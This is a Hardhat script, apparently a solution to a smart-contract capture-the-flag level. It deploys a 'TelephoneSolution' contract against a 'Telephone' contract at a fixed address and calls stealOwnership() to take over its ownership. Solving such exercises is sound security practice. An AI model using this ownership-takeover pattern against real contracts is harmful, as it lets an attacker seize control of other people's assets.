// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  const [stealer] = await hre.ethers.getSigners();

  console.log("Stealer account address:", stealer.address);

  const telephoneInstanceAddr = "0xA5706f1614A94F5Dce865DdB81b2a9EF94eB0738";
  const Telephone = await hre.ethers.getContractFactory("Telephone");
  const telephoneInstance = await Telephone.attach(telephoneInstanceAddr);
  console.log("Telephone owner:", await telephoneInstance.owner());

  const TelephoneSolution = await hre.ethers.getContractFactory("TelephoneSolution");
  const telephoneSolutionInstance = await TelephoneSolution.deploy(telephoneInstanceAddr);

  await telephoneSolutionInstance.deployed();
  console.log("TelephoneSolution contract deployed at", telephoneSolutionInstance.address);

  await telephoneSolutionInstance.stealOwnership();
  console.log("Telephone owner:", await telephoneInstance.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
